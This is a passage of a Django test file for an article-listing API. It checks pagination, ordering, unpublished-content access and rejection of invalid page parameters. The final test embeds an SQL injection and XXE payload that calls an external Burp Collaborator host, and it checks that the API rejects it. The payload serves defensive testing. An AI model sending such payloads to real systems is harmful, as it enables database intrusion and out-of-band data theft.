            # https://docs.djangoproject.com/en/1.10/topics/db/transactions/#use-in-tests
            expected_event = json.dumps({"type": "article", "id": self.msid})
            mock.publish.assert_called_once_with(Message=expected_event)


class RequestArgs(base.BaseCase):
    def setUp(self):
        ingest_these = [
            # "elife-01968-v1.xml.json",
            "elife-20125-v1.xml.json",  # poa
            "elife-20125-v2.xml.json",  # poa
            "elife-20125-v3.xml.json",  # vor
            # "elife-16695-v1.xml.json",
            # "elife-16695-v2.xml.json",
            # "elife-16695-v3.xml.json", # vor
            "elife-20105-v1.xml.json",  # poa
            "elife-20105-v2.xml.json",  # poa
            "elife-20105-v3.xml.json",  # poa
        ]
        ajson_dir = join(self.fixture_dir, "ajson")
        for ingestable in ingest_these:
            path = join(ajson_dir, ingestable)
            ajson_ingestor.ingest_publish(json.load(open(path, "r")))

        self.msid1 = 20125
        self.msid2 = 20105

        av = models.ArticleVersion.objects.get(
            article__manuscript_id=self.msid1, version=3
        )
        av.datetime_published = av.datetime_published + timedelta(
            days=1
        )  # helps debug ordering: 20125 is published after 20105
        av.save()

        self.c = Client()
        self.ac = Client(**{mware.CGROUPS: "view-unpublished-content"})

    #
    # Pagination
    #

    def test_article_list_paginated_page1(self):
        "a list of articles are returned, paginated by 1"
        url = reverse("v2:article-list") + "?per-page=1"
        resp = self.c.get(url)
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["list"])

        # correct data
        self.assertEqual(len(data["items"]), 1)  # ONE result, [msid1]
        self.assertEqual(data["total"], 2)
        self.assertEqual(data["items"][0]["id"], str(self.msid1))

    def test_article_list_paginated_page2(self):
        "a list of articles are returned, paginated by 1"
        resp = self.c.get(reverse("v2:article-list") + "?per-page=1&page=2")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["list"])

        # correct data
        self.assertEqual(len(data["items"]), 1)  # ONE result, [msid2]
        self.assertEqual(data["total"], 2)
        self.assertEqual(data["items"][0]["id"], str(self.msid2))

    def test_article_list_page_no_per_page(self):
        "defaults for per-page and page parameters kick in when not specified"
        url = reverse("v2:article-list") + "?page=2"
        resp = self.c.get(url)
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # correct data (too few to hit next page)
        self.assertEqual(len(data["items"]), 0)
        self.assertEqual(
            data["total"], 2
        )  # 100 per page, we asked for page 2, 2 results total

    def test_article_list_ordering_asc(self):
        resp = self.c.get(reverse("v2:article-list") + "?order=asc")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # correct data (too few to hit next page)
        self.assertEqual(len(data["items"]), 2)
        self.assertEqual(data["total"], 2)

        id_list = [int(row["id"]) for row in data["items"]]
        self.assertEqual(
            id_list, [self.msid2, self.msid1]
        )  # numbers ascend -> 20105, 20125

    def test_article_list_ordering_desc(self):
        resp = self.c.get(reverse("v2:article-list") + "?order=desc")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # correct data (too few to hit next page)
        self.assertEqual(len(data["items"]), 2)
        self.assertEqual(data["total"], 2)

        id_list = [int(row["id"]) for row in data["items"]]
        self.assertEqual(
            id_list, [self.msid1, self.msid2]
        )  # numbers descend 20125, 20105 <-

    def test_article_list_ordering_asc_unpublished(self):
        resp = self.ac.get(reverse("v2:article-list") + "?order=asc")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # correct data (too few to hit next page)
        self.assertEqual(len(data["items"]), 2)
        self.assertEqual(data["total"], 2)

        id_list = [int(row["id"]) for row in data["items"]]
        self.assertEqual(
            id_list, [self.msid2, self.msid1]
        )  # numbers ascend -> 20105, 20125

    def test_article_list_ordering_desc_unpublished(self):
        resp = self.ac.get(reverse("v2:article-list") + "?order=desc")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # correct data (too few to hit next page)
        self.assertEqual(len(data["items"]), 2)
        self.assertEqual(data["total"], 2)

        # numbers descend 20125, 20105 <-
        id_list = [int(row["id"]) for row in data["items"]]
        self.assertEqual(id_list, [self.msid1, self.msid2])

    #
    # bad requests
    #

    def test_article_list_bad_min_max_perpage(self):
        "per-page value must be between known min and max values"
        resp = self.c.get(reverse("v2:article-list") + "?per-page=-1")
        self.assertEqual(resp.status_code, 400)  # bad request

        resp = self.c.get(reverse("v2:article-list") + "?per-page=999")
        self.assertEqual(resp.status_code, 400)  # bad request

    def test_article_list_negative_page(self):
        "page value cannot be zero or negative"
        resp = self.c.get(reverse("v2:article-list") + "?page=0")
        self.assertEqual(resp.status_code, 400)  # bad request

        resp = self.c.get(reverse("v2:article-list") + "?page=-1")
        self.assertEqual(resp.status_code, 400)  # bad request

    def test_view_malicious_string(self):
        malicious_str = """1'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % gxurp SYSTEM "http://85br0ak8odwikzkm7mh80kqnfel8e024qvdm1b.burpcollab'||'orator.net/">%gxurp;]>'),'/l') from dual)||'"""
        resp = self.c.get(reverse("v2:article-list"), {"page": malicious_str})
        self.assertEqual(resp.status_code, 400)  # bad request
